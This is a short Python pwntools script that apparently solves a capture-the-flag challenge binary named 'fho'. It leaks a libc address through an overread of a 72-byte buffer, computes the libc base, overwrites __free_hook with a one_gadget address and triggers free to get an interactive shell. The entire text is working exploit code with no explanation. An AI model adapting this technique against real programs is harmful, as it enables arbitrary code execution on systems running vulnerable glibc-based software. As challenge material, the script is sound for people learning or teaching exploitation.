from pwn import *

p = process("./fho")
e = ELF("./fho")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.31.so")

buf = b"a" * 72
p.sendafter("Buf: ", buf)
p.recvuntil(buf)
libc_start_main = p.recvline()
libc_start_main = libc_start_main[:-1]
libc_start_main += b"\x00" * 2
libc_start_main = u64(libc_start_main)

libc_base = libc_start_main - libc.symbols["__libc_start_main"]
free_hook = libc_base + libc.symbols["__free_hook"]
og = libc_base + 0xe3afe
p.sendlineafter("To write: ", str(free_hook))
p.sendlineafter("With: ", str(og))
p.sendlineafter("To free: ", str(0x23554))



p.interactive()